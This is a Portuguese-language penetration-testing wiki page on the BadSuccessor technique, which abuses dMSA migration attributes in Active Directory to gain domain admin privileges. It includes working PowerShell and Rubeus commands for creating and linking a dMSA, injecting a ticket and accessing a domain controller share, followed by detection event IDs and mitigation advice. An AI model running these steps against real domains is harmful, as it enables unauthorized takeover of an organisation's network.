# BadSuccessor: Escalação de Privilégios via Abuso de Migração de dMSA Delegado

{{#include ../../banners/hacktricks-training.md}}

## Visão Geral

Contas de Serviço Gerenciadas Delegadas (**dMSA**) são a próxima geração sucessora das **gMSA** que serão lançadas no Windows Server 2025. Um fluxo de trabalho de migração legítimo permite que administradores substituam uma conta *antiga* (usuário, computador ou conta de serviço) por uma dMSA enquanto preservam permissões de forma transparente. O fluxo de trabalho é exposto através de cmdlets do PowerShell, como `Start-ADServiceAccountMigration` e `Complete-ADServiceAccountMigration`, e depende de dois atributos LDAP do **objeto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *link DN* para a conta supersedida (antiga).
* **`msDS-DelegatedMSAState`**       – estado da migração (`0` = nenhum, `1` = em andamento, `2` = *completo*).

Se um atacante puder criar **qualquer** dMSA dentro de uma OU e manipular diretamente esses 2 atributos, o LSASS e o KDC tratarão a dMSA como um *sucessor* da conta vinculada. Quando o atacante autentica como a dMSA **eles herdam todos os privilégios da conta vinculada** – até **Administrador de Domínio** se a conta de Administrador estiver vinculada.

Essa técnica foi chamada de **BadSuccessor** pela Unit 42 em 2025. No momento da redação, **nenhum patch de segurança** está disponível; apenas o endurecimento das permissões da OU mitiga o problema.

### Pré-requisitos do Ataque

1. Uma conta que é *permitida* a criar objetos dentro de **uma Unidade Organizacional (OU)** *e* possui pelo menos um dos seguintes:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** classe de objeto
* `Create Child` → **`All Objects`** (criação genérica)
2. Conectividade de rede com LDAP e Kerberos (cenário padrão de domínio unido / ataque remoto).

## Enumerando OUs Vulneráveis

A Unit 42 lançou um script auxiliar do PowerShell que analisa descritores de segurança de cada OU e destaca os ACEs necessários:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Sob o capô, o script executa uma busca LDAP paginada por `(objectClass=organizationalUnit)` e verifica cada `nTSecurityDescriptor` por

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (classe de objeto *msDS-DelegatedManagedServiceAccount*)

## Etapas de Exploração

Uma vez que uma OU gravável é identificada, o ataque está a apenas 3 gravações LDAP de distância:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Após a replicação, o atacante pode simplesmente **logon** como `attacker_dMSA$` ou solicitar um TGT Kerberos – o Windows irá construir o token da conta *superseded*.

### Automação

Vários PoCs públicos envolvem todo o fluxo de trabalho, incluindo recuperação de senha e gerenciamento de tickets:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Módulo NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Pós-Exploração
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detecção & Caça

Ative a **Auditoria de Objetos** em OUs e monitore os seguintes Eventos de Segurança do Windows:

* **5137** – Criação do objeto **dMSA**
* **5136** – Modificação de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Mudanças em atributos específicos
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emissão de TGT para o dMSA

Correlacionar `4662` (modificação de atributo), `4741` (criação de uma conta de computador/serviço) e `4624` (logon subsequente) destaca rapidamente a atividade de BadSuccessor. Soluções XDR como **XSIAM** vêm com consultas prontas para uso (veja referências).

## Mitigação

* Aplique o princípio de **menor privilégio** – apenas delegue a gestão de *Conta de Serviço* a funções confiáveis.
* Remova `Create Child` / `msDS-DelegatedManagedServiceAccount` de OUs que não exigem explicitamente.
* Monitore os IDs de evento listados acima e alerte sobre identidades *não-Tier-0* criando ou editando dMSAs.

## Veja também

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Referências

- [Unit42 – Quando Boas Contas se Tornam Ruins: Explorando Contas de Serviço Gerenciadas Delegadas](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Coleção de Ferramentas de Pentest](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [Módulo BadSuccessor do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
